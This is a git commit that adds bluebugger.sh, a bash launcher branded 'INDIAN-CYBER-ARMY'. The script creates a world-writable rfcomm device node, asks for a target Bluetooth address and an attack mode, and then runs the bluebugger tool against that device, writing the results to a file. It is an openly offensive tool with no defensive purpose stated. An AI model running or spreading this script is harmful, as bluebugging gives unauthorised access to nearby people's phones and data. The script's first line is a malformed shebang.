31d9198e08ca44f0debd17d137689355d7e9aa4a
WebDragon <117004849+webdragon63@users.noreply.github.com>
2024-06-21 11:33:36 +0000

    Add files via upload

---
+++ bluebugger.sh
@@ -0,0 +1,19 @@
+# bin/bash
+apt install figlet
+clear
+mkdir -p /dev/bluetooth/rfcomm
+mknod -m 666 /dev/bluetooth/rfcomm/0 c 216 0
+clear
+figlet -c Bluebugger
+cat << EOF
+                                Version : 1.0 
+                        Updated By : INDIAN-CYBER-ARMY 
+                  YouTube : www.youtube.com/@indiancyberarmy5
+
+EOF
+read -p "SET A BLUETOOTH ADDRESS ====>" ADDR
+read -p "SET ATTACK MODE ====>" MODE
+read -p "SET OUTPUT PATH ====>" P
+read -p "SET OUTPUT FILE NAME (only.txt format) ====>" N
+bluebugger -a $ADDR $MODE -c 2 -o $P$N
+
